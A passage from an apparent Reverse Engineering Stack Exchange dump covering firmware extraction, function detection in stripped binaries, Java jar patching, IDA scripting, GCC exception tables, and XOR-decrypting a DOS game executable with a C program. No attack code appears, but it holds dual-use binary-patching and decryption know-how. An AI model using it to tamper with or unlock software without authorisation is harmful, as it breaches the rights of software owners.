000000b0  14 00 00 00 08 00 fa 8b  5d 47 89 42 30 43 09 23  |........]G.B0C.#|
000000c0  00 00 93 4a 00 00 22 00  1c 00 73 79 73 74 65 6d  |...J..""...system|
000000d0  2f 73 79 73 74 65 6d 2f  6c 69 62 2f 6c 69 62 73  |/system/lib/libs|
000000e0  6e 73 5f 67 63 31 30 30  34 2e 73 6f 55 54 09 00  |ns_gc1004.soUT..|
000000f0  03 88 e7 31 56 88 e7 31  56 75 78 0b 00 01 04 ed  |...1V..1Vux.....|
00000100  03 00 00 04 ed 03 00 00  e5 7c 0b 78 53 55 d6 f6  |.........|.xSU..|
00000110  3e b9 b4 69 9a cb 69 cf  29 96 8b 92 0a           |&gt;..i..i.)....|
0000011d
</code></pre>

<p>Any idea why I'm not able to extract everything ? </p>

<p>Thank you !</p>

<p>Ronan</p>
","<p>Although my binwalk version extracted the files correctly to the <code>system</code> folder along with the zip files containing only the <code>sysversion.txt</code>, I shortly describe why you see only the <code>sysversion.txt</code> in the archive files.
It is because the firmware file contain multiple PKZIP archives and the binwalk does not know the exact size of these files. So, it can identify the start of the PKZIP file correctly based on the PK magic, but without knowing the correct file size, it extracts the remaining bytes to the created ZIP file. Because the central directory structure in PKZIP format stored at the end of the ZIP file, after the compressed data and the extracted ZIP file ends with the <code>sysversion.txt.zip</code>, the file viewer or decompressor may found the central directory of the last ZIP file.</p>

<p>To solve this problem, you may check the system folder in the same folder you found the ZIP files, or you can extract the files manually.<br>
If you take a look at the start of the <code>CH-sys-48.53.64.67.bin</code> file, you will find that it has a simple structure. It starts with a magic string (marked with blue in the picture). The next element is a 0x40 bytes long directory name (marked with yellow) followed by a 0x40 bytes long file name entry (marked with green). After the file name you will find the size of the file (marked with purple), some flags and the binary content (start of the binary file marked with grey).</p>

<p><a href=""https://i.stack.imgur.com/u3KtS.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/u3KtS.png"" alt=""enter image description here""></a></p>

<p>Based on these information you can write a simple script, which extracts the files correctly, for example:</p>

<pre><code>import sys
import struct

if (len(sys.argv) &lt; 2):
    print 'usage: parse binary'
    sys.exit(1)

b = open(sys.argv[1], 'rb').read()
o = 0x20
while(o &lt; len(b)-0x20):
    dir = b[o:o+0x40].strip('\x00')
    fname = b[o+0x40:o+0x80].strip('\x00')
    size = struct.unpack('L', b[o+0x80:o+0x84])[0]
    unk1 = struct.unpack('L', b[o+0x84:o+0x88])[0]
    unk2 = struct.unpack('L', b[o+0x88:o+0x8c])[0]
    print '%x, %s, %s: %x, %x, %x'%(o, dir, fname, size, unk1, unk2)
    open(fname, 'wb').write(b[o+0x8c:o+0x8c+size])
    o += 0x8c+size
</code></pre>
","11797"
"How to identify functions in a stripped binary on x86 32bit?","1697","","<p>I am trying to generate a <em>coarse-grained</em> Call Graph based on some assembly code disassembled from binary on x86 32 bit platform.</p>

<p>It is very hard to generate a precise Call Graph based on asm code, thinking of various indirect control flow transfer, so right now I <strong>only consider direct control flow transfer</strong>.</p>

<p>So firstly I am trying to identify <code>functions</code> (begin and end addresses) in the disassembled assembly code 
from a <strong>stripped</strong> binary on x86, 32bit.</p>

<p>Right now, my plan is somehow like this:</p>

<p>As for the begin addresses, I might conservatively consider any assembly code looks like this</p>

<pre><code>    push %ebp
</code></pre>

<p>indicates the beginning address of a function.</p>

<p>and also, I might scan the whole problem, identifying all the <code>call</code> instruction with the destination, the consider these function call's destinations as all the function begin address</p>

<p>The problems are:</p>

<ol>
<li><p>some of the functions defined in a binary might never be called.</p></li>
<li><p>some of the <code>call</code> has been optimised as <code>jump</code> by compiler (thinking of tail recursive call)</p></li>
</ol>

<p>As for the end address, things become more tricky because multiple <code>ret</code> could exist in one single function...</p>

<p>So I am thinking that I might conservatively consider the range between any nearest <strong>function begin addresses</strong>, as one function..</p>

<p>Am I right? Is there any better solution..?</p>
","<p>Reversing the call graph or the control flow graph of a binary isn't for the faint of heart, and is still a hot topic for researchers.</p>

<p>Your approach looks promising; but, unfortunately for you, you'll stumble upon lots of barriers.</p>

<p>One, following <code>call</code> instructions is most likely to give great results, if analyzing statically the binary file. The only problem is that, sometimes, you'll have indirect calls/jumps. Meaning, the operand will be a register containing the target address. This will occur very often if the target binary file original source code was written in <code>C++</code> (virtual functions) for example. One way to obtain the target address in this case is to emulate or run the chunk of code that computes it. Another is to assess its value heuristically (heuristics are hell). </p>

<p>Two, you can run your binary file with multiple input data sets and dynamically extract the call graphs (this can be performed through instrumentation). You can then cross reference all the obtained call graphs ...</p>

<p>Three, I would recommend a <a href=""https://en.wikipedia.org/wiki/Basic_block"">basic-block</a> centric approach rather than a functional one. Mainly, because a function is a basic-block in itself and you'll have more luck finding functions this way than trying to match patterns which can change from one compiler to another, or from one version of a compiler to another. </p>

<p>The following publications are extremely interesting : <a href=""http://www.cse.scu.edu/~atkinson/papers/apsec-04a.pdf"">[1]</a>, <a href=""http://www.cse.scu.edu/~atkinson/papers/serp-02.pdf"">[2]</a>, <a href=""http://ftp.cs.wisc.edu/pub/paradyn/papers/Harris05WBIA.pdf"">[3]</a>, and also I would encourage you to check <code>DynInst</code> and <code>callgrind</code> if you want to learn more about the subject.    </p>
","5831"
"Workflow patching Java jar file","1689","","<p>Normally I'm working with firmwares and native code executables, patching small things like constants, jump conditions etc. There I'm using IDA's disassembly to analyse what and where to patch.
With Java bytecode I would tend to use the decompiled code from a tool like jd-gui for analysing what to patch. But for actually changing anything I would need a connection between the decompiled code and the bytecode.
Is there a tool that can show this </p>
","<ol>
<li>Use <a href=""http://jd.benow.ca/"" rel=""nofollow"">JD-GUI</a> to examine the jar file</li>
<li>Unpack the jar file
<ul>
<li><code>jar -xf yourapp.jar</code> </li>
</ul></li>
<li>Modify the .class file with a Java Bytecode Editor
<ul>
<li>Use <a href=""http://set.ee/jbe/"" rel=""nofollow"">Java Bytecode Editor (JBE)</a>    </li>
</ul></li>
<li>Repack the modified classes into new archive file
<ul>
<li><code>jar -cvf yourapp_patched.jar *.*</code></li>
</ul></li>
</ol>

<p><a href=""https://blog.netspi.com/patching-java-executables-the-easy-way/"" rel=""nofollow"">Credits for this particular solution to Khai Tran @ NetSPI</a></p>
","8925"
"best alternatives to IDA, Immunity and Ollydbg for a blind user","1687","","<p>I am totally blind and want to learn to do reverse engineering so I can advance my career. Unfortunately, IDA, Immunity and Ollydbg are all not accessible to a blind person using a screenreader.</p>

<p>Are there any good alternatives on both windows and Linux for these tools?
I have used gdb on Linux a little and windbg on windows as well.</p>

<p>I just need a recommendation on what is industry standard if the three biggies can't be used?</p>

<p>Thanks,
Don</p>
","<p>You can use <a href=""https://sourceware.org/gdb/"" rel=""nofollow"">gdb</a> on Linux, <a href=""https://msdn.microsoft.com/en-us/windows/hardware/hh852365"" rel=""nofollow"">WinDBG</a>, and could give a try to <a href=""http://rada.re"" rel=""nofollow"">radare2</a>: it's not as rock-stable as the two previous ones, but it's tailored for reverse engineering, and supports <code>gdb://</code> and <code>windbg://</code> protocols ;) All of them have a textual interface that should be suitable for braille-interfaces.</p>

<p>But I guess that the killer-feature of radare2 for blind people is that it has ascii control-flow graphs:</p>

<pre><code>                       =------------------------------------------------------=
                       | [0x400536]                                           |
                       | main:                                                |
                       | (fcn) sym.main 50                                    |
                       | ; arg int arg_0_2      @ rbp+0x2                     |
                       | ; var int local_0_1    @ rbp-0x1                     |
                       | push rbp                                             |
                       | mov rbp, rsp                                         |
                       | sub rsp, 0x10                                        |
                       | mov dword [rbp - 4], edi                             |
                       | mov qword [rbp - 0x10], rsi                          |
                       | cmp dword [rbp - 4], 2 ; test.c:2     if (argc &gt; 2)  |
                       | jle 0x400557 ;[a]                                    |
                       =------------------------------------------------------=
                             t f
  .--------------------------' '------------------------------.
  |                                                           |
  |                                                           |
=--------------------------------------------------=      =--------------------------------------------------=
|  0x400557                                        |      |  0x40054b                                        |
| mov edi, 0x4005f7 ; test.c:5         puts(""Oo""); |      | mov edi, 0x4005f4 ; test.c:3         puts(""Ok""); |
| call sym.imp.puts ;[b]                           |      | call sym.imp.puts ;[b]                           |
=--------------------------------------------------=      | jmp 0x400561 ;[c]                                |
    v                                                     =--------------------------------------------------=
    |                                                         v
    '-----------------------------------.---------------------'
                                    |
                                    |
                                =-------------------------------------=
                                |  0x400561                           |
                                | mov eax, 0 ; test.c:6     return 0; |
                                | leave ; test.c:7 }                  |
                                | ret                                 |
                                =-------------------------------------=
</code></pre>

<p>There are a lot of slides available from various talks about radare2, but I guess the easiest way to lrean how to use it is to read the <a href=""https://www.gitbook.com/book/radare/radare2book/details"" rel=""nofollow"">radare2 book</a>. I'm quite sure that everyone would be happy to help you/implement missing features on the irc channel!</p>
","12016"
"How to change a large section of bytes to words in IDA Pro","1687","","<p>I have a large section in IDA that is a data lookup table of word length data.  I want to change them all to word length rather than byte length.  I know you can make an array but when I do it becomes an array of bytes.</p>
","<ol>
<li>Create one word (or dword)</li>
<li>Use the ""Make array"" command to create an array of words. You can select the range of data you want to convert to automatically calculate the item count.</li>
</ol>

<p>If you want to have each element as a separate item and not part of array, uncheck the ""Create as array"" option.</p>
","1978"
"How to recover the exception info from .gcc_except_table and .eh_handle sections?","1687","","<p>For <code>C++</code> program with <code>try</code> <code>catch</code> defined, when using <code>g++</code> to compile it into assembly code (test is on x86 32bit Linux, <code>g++</code> 4.6.3)</p>

<pre><code>g++ -S cppexcept.cc
</code></pre>

<p>A specified section called <code>.gcc_except_table</code> is produced like below:</p>

<pre><code>        .section        .gcc_except_table
        .align 4
.LLSDA980:
        .byte   0xff
        .byte   0
        .uleb128 .LLSDATT980-.LLSDATTD980
.LLSDATTD980:
        .byte   0x1
        .uleb128 .LLSDACSE980-.LLSDACSB980
.LLSDACSB980:
        .uleb128 .LEHB3-.LFB980
        .uleb128 .LEHE3-.LEHB3
        .uleb128 0
        .uleb128 0
        .uleb128 .LEHB4-.LFB980
        .uleb128 .LEHE4-.LEHB4
        .uleb128 .L19-.LFB980
        .uleb128 0x3
        .uleb128 .LEHB5-.LFB980
        .uleb128 .LEHE5-.LEHB5
        .uleb128 0
        .uleb128 0
        .uleb128 .LEHB6-.LFB980
        .uleb128 .LEHE6-.LEHB6
        .uleb128 .L20-.LFB980
        .uleb128 0
        .uleb128 .LEHB7-.LFB980
        .uleb128 .LEHE7-.LEHB7
        .uleb128 .L21-.LFB980
        .uleb128 0
</code></pre>

<p>After the compilation into <code>exe file</code> with <code>ELF</code> format, it seems that there are two sections related to exception handling, which are <code>.gcc_except_table</code> and <code>.eh_frame</code>. </p>

<p>However, I dumped the contents of these two section with the following commands, comparing the labels' memory addresses with what are defined in <code>.gcc_except_table</code>, but it seems too blur to me...</p>

<pre><code>objdump -s -j .gcc_except_table cppexcept
objdump -s -j .eh_frame cppexcept
</code></pre>

<p>So my question is:</p>

<p>Is there any way to recover the information defined in the <code>.gcc_except_table</code> (which is shown above) from <code>ELF</code> file's <code>.gcc_except_table</code> and <code>eh_frame</code> tables?</p>
","<p>(I think you may get some extra comments if you use <code>-fverbose-asm</code>.)</p>

<p>Recovering information from these tables is definitely possible, although documentation is scarce and is often present only in the code which parses them. </p>

<p>The <code>.eh_frame</code> layout is described briefly in the <a href=""http://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/ehframechpt.html"">LSB documentation</a>. Ian Lance Taylor (author of the gold linker) also made some blog posts on <a href=""http://www.airs.com/blog/archives/460""><code>.eh_frame</code></a> and <a href=""http://www.airs.com/blog/archives/464""><code>.gcc_except_table</code> layout</a>.</p>

<p>For a more reference-like description, check my <a href=""http://www.hexblog.com/wp-content/uploads/2012/06/Recon-2012-Skochinsky-Compiler-Internals.pdf"">Recon 2012 slides</a> (start at 37 or so).</p>

<p>I've made <a href=""http://www.hexblog.com/wp-content/uploads/2012/06/recon-2012-skochinsky-scripts.zip"">an IDA script</a> (<code>gcc_extab.py</code>) which parses <code>.eh_frame</code> and <code>.gcc_except_table</code> and formats them nicely.</p>

<p>Taking a sample program:</p>

<pre><code>void f()
{
    throw 1;
}

int main()
{
    int j;
    try {
        f();
    } catch (int i) {
        j = i;
    }   
    return 0;
}
</code></pre>

<p>I'll show the commented structures produced by GCC.</p>

<p>First, the <code>.eh_table</code> (some parts omitted for clarity):</p>

<pre><code>.Lframe1:                     # start of CFI 1
    .long   .LECIE1-.LSCIE1   # length of CIE 1 data
.LSCIE1:                      # start of CIE 1 data
    .long   0                 # CIE id
    .byte   0x1               # Version
    .string ""zPL""             # augmentation string:
                              # z: has augmentation data
                              # P: has personality routine pointer
                              # L: has LSDA pointer
    .uleb128 0x1              # code alignment factor
    .sleb128 -4               # data alignment factor
    .byte   0x8               # return address register no.
    .uleb128 0x6              # augmentation data length (z)
    .byte   0                 # personality routine pointer encoding (P): DW_EH_PE_ptr|DW_EH_PE_absptr
    .long   __gxx_personality_v0 # personality routine pointer (P)
    .byte   0                 # LSDA pointer encoding: DW_EH_PE_ptr|DW_EH_PE_absptr
    .byte   0xc               # Initial CFI Instructions
    [...]
    .align 4
.LECIE1:                      # end of CIE 1
    [...]

.LSFDE3:                      # start of FDE 3
    .long   .LEFDE3-.LASFDE3  # length of FDE 3
.LASFDE3:                     # start of FDE 3 data
    .long   .LASFDE3-.Lframe1 # Distance to parent CIE from here
    .long   .LFB1             # initial location                
    .long   .LFE1-.LFB1       # range length                    
    .uleb128 0x4              # Augmentation data length (z)    
    .long   .LLSDA1           # LSDA pointer (L)                
    .byte   0x4               # CFI instructions                
    .long   .LCFI2-.LFB1
    [...]
    .align 4
.LEFDE3:                      # end of FDE 3
</code></pre>

<p>Next, the LSDA (language-specific data area) in <code>.gcc_except_table</code>, referenced by FDE 3:</p>

<pre><code>.LLSDA1:                           # LSDA 1
    .byte   0xff                   # LPStart encoding: DW_EH_PE_omit
    .byte   0                      # TType encoding: DW_EH_PE_ptr|DW_EH_PE_absptr
    .uleb128 .LLSDATT1-.LLSDATTD1  # TType offset
.LLSDATTD1:                        # LSDA 1 action table
    .byte   0x1                    # call site encoding: DW_EH_PE_uleb128|DW_EH_PE_absptr
    .uleb128 .LLSDACSE1-.LLSDACSB1 # call site table length
.LLSDACSB1:                        # LSDA 1 call site entries
    .uleb128 .LEHB0-.LFB1          # call site 0 start
    .uleb128 .LEHE0-.LEHB0         # call site 0 length
    .uleb128 .L8-.LFB1             # call site 0 landing pad
    .uleb128 0x1                   # call site 0 action (1=action 1)
    .uleb128 .LEHB1-.LFB1          # call site 1 start
    .uleb128 .LEHE1-.LEHB1         # call site 1 length
    .uleb128 0                     # call site 1 landing pad
    .uleb128 0                     # call site 1 action (0=no action)
.LLSDACSE1:                        # LSDA 1 action table entries
    .byte   0x1                    # action 1 filter (1=T1 typeinfo)
    .byte   0                      # displacement to next action (0=end of chain)
    .align 4
    .long   _ZTIi                  # T1 typeinfo (""typeinfo for int"")
.LLSDATT1:                         # LSDA 1 TTBase
</code></pre>
","6312"
"Dynamic Analysis for Shared Libraries?","1679","","<p>Are there techniques for dynamic analysis of shared libraries? I know for example that DLLs have an entry point, but how about calling other exported functions? Do I need to write a custom executable that calls exports for each DLL I want to analyze?</p>
","<p>A dynamically linked library has the same executable header and structure as a standard executable. Therefore they can be debugged the same way that a normal executable can be debugged. It might be a bit tricker than usual, because in order to debug it, it has to be loaded into some process, and making that happen could be trivial (i.e. if it's loaded as part of some other program) or it might take some doing. </p>

<p>A common technique is to use something like <a href=""http://www.ollydbg.de/Loaddll.htm"" rel=""nofollow noreferrer"">OllyDbg's LoadDll</a>.  The linked page describes a few examples of calling exports within the DLL directly.  Although OllyDbg has some smarts to determine the number of function arguments, it's likely that you will have to do some reverse engineering to figure out what the types of those arguments should be.  See <a href=""https://reverseengineering.stackexchange.com/questions/2134/get-the-function-prototypes-from-an-unknown-dll"">this recent question</a> for some advice on how to go about doing that.</p>

<p>Alternative, you can write a small program to load the DLL and call interesting exports manually.  This is still subject to the limitations of needing to know how to interface with the DLL, but at the same time, this programming route might prove necessary in order to thoroughly reverse engineer your target.  I.e., perhaps you need to call some export in order to create some object that the program is expecting as input for another export.  LoadDll will quickly prove cumbersome, and writing this program really ought not to be that difficult.</p>
","2151"
"How to get the list of strings within IDA's string window in my script?","1673","","<p>I'm trying to write some scripts that do some string searching through the disassembly in IDA. Currently, I loop through all the disassembly, MinEA() to MaxEA() and use idc.FindText() to see if a potential string is in the disassembly. Although this works, its very time consuming. I was wondering if there was a way I could just use an API method to get all the strings in IDAs string window. For example, I was able to get all the imports used in the import window by using idaapi.get_import_module_qty() and idaapi.enum_import_names(i, import_call_back). That's very fast and I can easily just check if something has been imported. Is there something similar that will allow me to get all the strings from the strings window? If not, is there a less time-consuming method of string searching that is possible? Thanks for any input.</p>
","<p>It looks like that the following is what you are looking for or at least similar:</p>

<pre><code>import idautils
sc = idautils.Strings()

for s in sc:
    print ""%x: len=%d type=%d -&gt; '%s'"" % (s.ea, s.length, s.type, str(s))
</code></pre>

<p>Tested and works in IDA 6.8, 64 bit.
The details about the class Strings in idautils module are here: <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/idautils.Strings-class.html"" rel=""nofollow"">https://www.hex-rays.com/products/ida/support/idapython_docs/idautils.Strings-class.html</a></p>
","13104"
"How to quickly distinguish PE/DLL/DOS-MZ files based on magic numbers?","1672","","<p>I know that the specifications of the Microsoft PE/DLL/DOS-MZ files states that the two first bytes of a PE/DLL/DOS-MZ file is <code>MZ</code> (0x4d,0x5a<code>) or</code>ZM<code>(</code>0x5a,0x4d`).</p>

<p>The problem with such a small signature is that a lot of other files may match the same specification and a test based only on this two first bytes quickly tends to be inconclusive.</p>

<p>So, my question is simple, after testing that the two first bytes are <code>MZ</code> (or <code>ZM</code>), what other, more reliable, test can be performed to check that the file is a PE/DLL/DOS-MZ?</p>
","<p>That would be <code>e_lfanew</code> in the <code>MZ</code> header itself. For simple (16 bit) MSDOS software, this ought to be <code>0</code>, and for any extended format it should point right to one of the specific <code>LE</code>, <code>PE</code>, or <code>NE</code> headers' identifiers (which all are exactly those two characters). As in all of these cases the header itself is a mere stub, <code>e_cp</code> (the total size of this executable in pages) should not be larger than the offset of <code>e_lfanew</code>. (Plus or minus that infernal <code>e_cblp</code>, the ""bytes on last page of file"" – I always forget which one it is.)</p>

<p>See <a href=""https://msdn.microsoft.com/en-us/library/ms809762.aspx"" rel=""nofollow"">Peering inside the PE</a>, an article that despite its age still is very useful.</p>
","12994"
"Identifying an unknown chip on a PCB","1671","","<p>I'm working on reverse engineering a PCB (no documentation by manufacturer). I've identified all the other chips on this board but this one refuses to give up any google-able info. Are there any resources that can help me identify what kind of chip this is?</p>

<p><a href=""https://imgur.com/Q4ZLFo5"" rel=""nofollow noreferrer""><img src=""https://i.imgur.com/Q4ZLFo5.png"" title=""Hosted by imgur.com"" /></a></p>

<pre><code>      ______________
D1 --|O    ATH 330  |--?
D2 --|              |--Vss
Vss--|     50?L  8  |--D4
GND--|     3U49758  |--D5
      --------------
</code></pre>

<p>D1, D2, D3 and D4 pins are connected to a 5x2 grid of test points which I've soldered a header into. Vss is connected to the Vss of a PIC32MX695F512H microcontroller.</p>

<p>Let me know if I can provide additional info to assist this process.</p>
","<p>The markings look like an Atmel part (it starts with ""AT"", which is common for Atmel parts). Given the size of the chip and context which you provided, I figured it was probably a serial EEPROM. Looking through Atmel's serial EEPROM datahsheets, your mystery chip is almost certainly an Atmel AT25128B-SSHL SPI EEPROM, which matches your chip's product markings and pinout.</p>

<p>According to the AT25128B <a href=""http://www.atmel.com/Images/doc8698.pdf"">datasheet</a>, the first line should be ATHXXX, where XXX is a three digit date code. In your case, ""ATH330"" means it was made in the 30th week of 2013.</p>

<p>The second line contains the product's truncated part number (truncated part numbers are used when the entire part number is too long to fit on the package) and country of assembly. The truncated part number for the AT25128B is ""5DBL"", which from the picture looks reasonably like what is printed on your chip, and the trailing ""8"" identifies the country of assembly (I don't know what country ""8"" corresponds to, but its probably somewhere in Asia :)).</p>

<p>The last line is the Atmel lot number.</p>
","4603"
"How can I find the source of a string in an old DOS game?","1664","","<p>I am attempting to amend some strings in an old DOS game (FIFA International Soccer), specifically the names of players.</p>

<p>In the past it hasn't been too hard to pull off such a task on post-DOS games as either the strings are easy to track down in the executable or a data file.  However, for this DOS game I am stuck.</p>

<p>I have scanned through the game files and the executable with a hex-editor but cannot find the strings.  The game includes a <code>english.dat</code> file which does contain readable localised strings.  However, this file only contains names for in game headers and menu options as opposed to the player names I am seeking.  The other files consist of localised strings for other languages, graphics and sounds.</p>

<p>I have used a debug build of DOSBOX to perform a memory dump using the following command:</p>

<pre><code>memdumpbin 180:0 1000000
</code></pre>

<p>I got the command from here: <a href=""http://www.vogons.org/viewtopic.php?t=9635"">http://www.vogons.org/viewtopic.php?t=9635</a></p>

<p>In the memory dump I <strong>can</strong> find the strings I wish to change.</p>

<p>What is the best way of linking this information to find the source of the strings?  I assume that these strings are somehow encrypted or compressed in the executable, although it could be in another obscure game file.  If the strings are compressed/encrypted perhaps there is a common method for pulling this data out of the executable.</p>

<p>I have IDA5 (free version) installed and would be happy using this as part of process.  My operating system is Windows 8 / 64 bit.</p>

<p>Also, to be clear - I want to modify the strings at source (i.e. in the file) and not in memory.</p>
","<p>This program uses the PharLap DOS extender, as can be seen in its MZ header. The 32-bit executable program starts at offset <code>18A0</code>, per ""offset within header of relocation table"" (see <a href=""http://www.program-transformation.org/Transform/PcExeFormat"">http://www.program-transformation.org/Transform/PcExeFormat</a>), and at that position you can see the correct signature <code>P3</code>. According to the header info, the executable's length is <code>0x95851</code>, which is another hint this is correct. Near the end of this part, starting at <code>18A0</code>, you can see a text string  ""Hello EA"", and at the next 32-byte ""page"" the signature <code>MZ</code> that indicates another executable is embedded. So this large part must contain the main executable.</p>

<p>Browsing the file with a simple hex editor at my preferred width of 16 hex characters, I noticed a recurring pattern when doing page-downs (a good way to get a 'sense' of what sort of data a file contains). I saw the pattern repeated every 2 lines, and when I set the display width to 32, the pattern was evident. Executable formats always start with a fixed header, and are usually followed by lots of zeroes for padding, so I suspected the repeating pattern may be the XOR key. A simple C program confirmed this; I did not know where to start with decoding but the first non-all-zeroes multiple of 32 seemed a good guess: offset <code>0x1AA0</code>. </p>

<p>Decoding from there proved the hunch to be correct:</p>

<pre><code>00000 : Y...r9..n3.&gt;..-.A@I.7P........h4..a""1.P(s.......x. rG..f...X.+..
00040 : ..a|D.P(.b..A...x......f3..F..h4....a.P(...........o7..f3..F2...
00080 : .@@@@@@...@@BLASTER=@ULTRASND=@GOLD=@mvsound.sys@DEVICEdevice@@@
000C0 : @@@@@@@@@@@.......ULTRAMID@@@@@@@@@@@@@@@ ..@.@@@@@@.........@.@
00100 : .@.@.@.@.@.@.@.@.@.@.@.@.@.@.@.@.@@.@@@@..@@...@@@..@@......&amp;...
00140 : ./....8....C....N....X...@c.@@ m....y...................C.......
00180 : .PCSPKR.ADV@MT32MPU.ADV@ADLIB.ADV@ADLIBG.ADV@SBFM.ADV@SBFM.ADV@S
001C0 : BP1FM.ADV@SBP2FM.ADV@PASFM.ADV@PASOPL.ADV@TANDY.ADV@GF1MIDI.ADV@
00200 : CUST_MID.ADV@SBP2FM.ADV@SBAWE32.ADV@@@@ALGDIG.ADV@SBDIG.ADV@SBDI
00240 : G.ADV@SBPDIG.ADV@SBPDIG.ADV@PASDIG.ADV@PASDIG.ADV@@GF1DIGI.ADV@C
(etc.)
</code></pre>

<p>so the next step was scroll down to near the end of this part and see what was there. Disaster! Rather than readable texts, all I saw was random data -- yet still with clear patterns.</p>

<p>But 'an executable' is not one contiguous long chunk of data. It's common to see it divided up into separate sections for ""executable code"", ""initialized data"", ""uninitialized data"", ""relocations"" and so on. The sections all start at an aligned address when loaded into memory, but not necessarily in the file itself, or with the same 'memory page' size. Therefore, it may be possible that the XOR encryption restarts at the start of new section. The PharLap header should contain information on where each section starts and ends (and if you are going to attempt to adjust the program, you should look into this), but to confirm the XOR key is the same all I had to do is adjust the starting position. Starting one position further, no success, but 2 positions further on I noticed this piece of data:</p>

<pre><code>890C0 : B.@.L.@^W.@.a.@^l.@.v.@^..@...@ @ @ @ @ @ @ @~FIFA International
89100 :  Soccer@ @PC Version by@~The Creative Assembly@ @~Lead Programme
89140 : r@ @Tim Ansell@ @ @ @~Programmers@ @Adrian Panton@Clive Gratton@
89180 :  @ @~Lead Artist@ @Will Hallsworth@ @ @ @~Additional Artwork@ @A
891C0 : lan Ansell@ @ @ @~Original Music@Composed, Produced@and Performe
89200 : d by@Ray Deefholts@for ~HFC Music@ @Additional Drum@Programming 
89240 : and@Assistance@ @Tim Ansell@ @~Sound Effects@ @Bill Lusty@ @ @ @
89280 : ~Producer@ @Kevin Buckner@ @ @ @~Associate Producer@ @Nick Golds
(etc.)
</code></pre>

<p>That was the proof I needed: the data section <em>does</em> use the same XOR key. Next: testing all possibilities from 0 to 31 and see if something turns up. Only at +30 that turned out to work, just as I was going to give up:</p>

<pre><code>782C0 : ..@...@,..@..Algeria@Ali Mehdaoui Igail@Mohammed Said@Abdel Dahb
78300 : i@Hamid Ahkmar@Nagar Baltuni@Omar Mahjabi@Ali Cherif@Hamar Mahbo
78340 : ud@Khered Adjali@Imahd Tasfarouk@Alamar Sahid@Mahmar Ahboud@Akha
78380 : r Binnet@Mouhrad Dahlib@Mahied Amruk@Lakhar Diziri@Amaar Azir@Mu
783C0 : stafa Farai@Akmar Bahoud@Ahmad Said@Taraki Aziz@Argentina@Alfio 
(etc.)
</code></pre>

<p>So each individual section in the executable is encrypted with a 32-byte XOR key; this XOR key is the same for all <em>sections</em>; it starts a-new per section.</p>

<p>The C program below will decrypt the entire file and you have to adjust the starting position manually. To edit the file, you have to:</p>

<ol>
<li>Read up on PharLap's sections.</li>
<li>Decrypt each section individually.</li>
<li>Write all into a new file.</li>
<li>Adjust what you want.</li>
<li>Encrypt the sections again (it's a XOR key, so this uses the exact same algorithm).</li>
<li>Copy the encrypted file back into the main executable.</li>
</ol>

<p>A note on #4: you mentioned changing the names of the players. Since it's a zero-terminated list of names, you can assume there is a list of pointers <em>to</em> these names somewhere else. That means you can only change the individual <em>characters</em> of a name -- not make it longer. If you want to adjust all names freely, you must find the list of pointers and adjust that as well.</p>

<hr>

<p>(Preliminary updates)</p>

<ol>
<li><p>The XOR encoding does not use sections. Instead, it seems like every block starts with a word determining its length, and possibly 1 or 2 next words (possibly (again) to set the XOR key starting position). Not conclusive so far.</p></li>
<li><p>Executables are <em>abundant</em> with zeroes. If you count the number of zeroes in each 32-byte chunk, XORed against all 32 possible positions, and print out the XOR position with the highest number of them, you can see successive lists of the same 'best' guess. That shows there are longer and shorter sections XORed with the same key and may help determining the length algorithm.</p></li>
</ol>

<hr>



<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

unsigned char encrypt[32] = {
    0x23, 0x91, 0xC8, 0xE4, 0x72, 0x39, 0x9C, 0xCE,
    0x67, 0x33, 0x99, 0xCC, 0xE6, 0x73, 0xB9, 0x5C,
    0x2E, 0x17, 0x8B, 0x45, 0xA2, 0x51, 0xA8, 0x54,
    0x2A, 0x95, 0xCA, 0x65, 0x32, 0x19, 0x8C, 0x46
};

int main(int argc, char *argv[])
{
    FILE *f;
    int i, c, d = 0;

    f = fopen (""../Downloads/fifa/fifa.exe"", ""rb"");
    if (!f)
    {
        printf (""yeah no such file\n"");
        return 0;
    }

    /* reasonable assumption for start: */
    fseek (f, 0x1aa0, SEEK_SET);
    /* adjust per section! this position is valid for the names only */
    fseek (f, 30, SEEK_CUR);
    c = 0;
    printf (""%05X : "", d);
    do
    {
        d++;
        i = fgetc (f);
        if (i == EOF) break;
        i ^= encrypt[c &amp; 31];
        if (i &gt;= ' ' &amp;&amp; i &lt;= '~') putchar (i); else if (i) putchar ('.'); else putchar ('@');
        if (++c &gt;= 64)
        {
            c = 0;
            printf (""\n"");
            printf (""%05X : "", d);
        }
    } while (d &lt; 0x95851);
    fclose (f);

    return 0;
}
</code></pre>
","8409"
"What is this 'mathematical jigsaw puzzles' obfuscation?","1661","","<p>You must have heard about it, it all over the on-line newspapers. Some researchers from UCLA claims to have achieved a <a href=""http://newsroom.ucla.edu/portal/ucla/ucla-computer-scientists-develop-247527.aspx"">breakthrough in software obfuscation</a> through 'mathematical jigsaw puzzles'. </p>

<p>Their <a href=""http://eprint.iacr.org/2013/451.pdf"">scientific paper</a> can be found on <a href=""http://eprint.iacr.org/2013/451"">IACR eprint website</a>.</p>

<p>Can someone sum-up what is really the content of the paper (and does is really worth it) ?</p>
","<p>There are three main contributions of the research</p>

<ol>
<li><p>A proposed indistinguishability obfuscation for NC<sup>1</sup> circuits where the security is based on the so called <em>Multilinear Jigsaw Puzzles</em> (a simplified variant of multilinear maps).</p></li>
<li><p>Pair the contribution in 1 with Fully Homomorphic Encryption and you get indistinguishability obfuscation for all circuits.</p></li>
<li><p>Combine 2 with public key encryption and non-interactive zero-knowledge proofs and you functional encryption for all circuits. I believe that prior to this functional encryption for <strong>all</strong> circuits was not possible.</p></li>
</ol>

<p>So, lets look at these in turn.</p>

<p><strong>Indistinguishability obfuscation</strong> (contributions 1 and 2)<br>
From the paper</p>

<blockquote>
  <p>It is important to note that unlike simulation-based definitions of obfuscation, it is not immediately
  clear how useful indistinguishability obfuscators would be. Perhaps the strongest philosophical justification
  for indistinguishability obfuscators comes from the work of Goldwasser and Rothblum [GR07], who showed
  that (efficiently computable) indistinguishability obfuscators achieve the notion of Best-Possible Obfuscation [GR07]: Informally, a best-possible obfuscator guarantees that its output hides as much about the input circuit as any circuit of a certain size.</p>
</blockquote>

<p>Thus, the main contributions when it comes to Indistinguishability obfuscation of this paper is to show a construction for IO that works on all circuits, then pair that with a few other things to get functional encryption for any circuits.</p>

